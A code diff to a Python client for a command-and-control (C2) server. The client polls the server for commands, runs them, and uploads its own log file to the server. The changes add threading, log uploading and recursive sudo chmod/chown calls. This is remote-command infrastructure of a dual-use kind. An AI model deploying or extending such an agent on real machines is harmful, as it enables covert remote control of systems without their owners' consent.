@@ -44,14 +44,14 @@ class Client:
         prev (str): String identifying the previously executed command.
         server_addr (str): Address of the C2 server (in the form <protocol>://<url>[:<port>]).
         op_name (str): The name of the op that the client is participating in, for fetching appropriate commands.
-        client_id (uuid): A (hopefully) unique identifier for the client for server check-ins.
+        client_id (str): A (hopefully) unique identifier for the client for server check-ins.
     """
     def __init__(self, server_addr: str, op_name: str):
         self.retries = 0
         self.prev = None
         self.server_addr = server_addr
         self.op_name = op_name
-        self.client_id = uuid.uuid4()
+        self.client_id = str(uuid.uuid4())
 
 
         self._load_prev_command()
@@ -82,17 +82,20 @@ class Client:
         if not os.access('/app', os.W_OK) or not os.access('/app', os.R_OK):
             # If we have read-write access to /app, then it is likely set up correctly. Otherwise,
             #  traverse /app and make all files/dirs read/write/execute for user and read-only for group.
+            permissions = stat.S_IRWXU | stat.S_IRGRP
             try:
+                os.chmod('/app', permissions)
                 for root, dirs, files in os.walk('/app'):
                     for d in dirs:
-                        os.chmod(os.path.join(root, d), stat.S_IRWXU)
-                        os.chmod(os.path.join(root, d), stat.S_IRGRP)
+                        os.chmod(os.path.join(root, d), permissions)
+                        os.chmod(os.path.join(root, d), permissions)
                     for f in files:
-                        os.chmod(os.path.join(root, f), stat.S_IRWXU)
-                        os.chmod(os.path.join(root, f), stat.S_IRGRP)
+                        os.chmod(os.path.join(root, f), permissions)
+                        os.chmod(os.path.join(root, f), permissions)
             except PermissionError as e:
                 logger.info('Could not chmod /app. Trying with sudo instead.')
-                os.system('sudo chmod 740 /app')
+                os.system('sudo chmod -R 740 /app')
+                os.system(f'sudo chown -R {getpass.getuser()}:{os.getegid()} /app')
 
     def _load_prev_command(self):
         """Fetch the last command executed and stored in the cache file."""
@@ -105,6 +108,16 @@ class Client:
             with open(cached_cmd_file, 'r') as f:
                 last_cmd = f.read().strip()
                 self.prev = last_cmd
+
+    def start_as_thread(self):
+        """Runs the client in an independent thread for concurrent execution."""
+        t = threading.Thread(target=self.start)
+        t.start()
+
+    def start(self):
+        """Runs the client indefinitely."""
+        while True:
+            self.fetch_next_command()
 
     def update_cache_file(self):
         """Update the file that caches the previously-executed command."""
@@ -193,6 +206,19 @@ class Client:
                 time.sleep(util.default_wait_time())
                 return
 
+    def post_log(self):
+        """Post the log for the client to the C2 server.
+
+        Currently, this uploads the log as a file to the file server, but implementation may change in the future.
+        """
+        curr_time = datetime.datetime.now().replace(microsecond=0)
+        log_file_data = (f'{self.client_id}_{curr_time}_app.log', open(util.get_log_file(), 'rb'), 'text/plain')
+        try:
+            r = requests.post(f'{self.server_addr}/file/upload', files={'file': log_file_data}, data={'op_name': self.op_name})
+        except Exception as e:
+            logger.warn('Exception encountered while attempting to post client log.')
+            logger.warn(e)
+
     def handle_command(self, data):
         """Executes a given command.
 
@@ -218,10 +244,8 @@ class Client:
             if data['cmd'] == 'stop':
                 exit()
             elif data['cmd'] == 'logs':
-                # TODO: upload logs to server.
-                curr_time = datetime.datetime.now().replace(microsecond=0)
-                log_file_data = (f'{self.client_id}_{curr_time}_app.log', open(util.get_log_file, 'rb'), 'text/plain')
-                r = requests.post(f'{self.server_addr}/files/upload', files={'file': log_file_data}, data={'op_name': self.op_name})
+                if (not 'client_id' in data) or (self.client_id == data['client_id']):
+                    self.post_log()
             else:
                 logger.warning(f'Invalid control command: {data["cmd"]}')
         else:
@@ -233,9 +257,7 @@ def main(server_address, op_name):
     These arguments are passed from the command line when run standalone.
     """
     c = Client(server_address, op_name)
-        
-    while True:
-        sleep_time = c.fetch_next_command()
+    c.start()
 
 if __name__ == "__main__":
     usage()
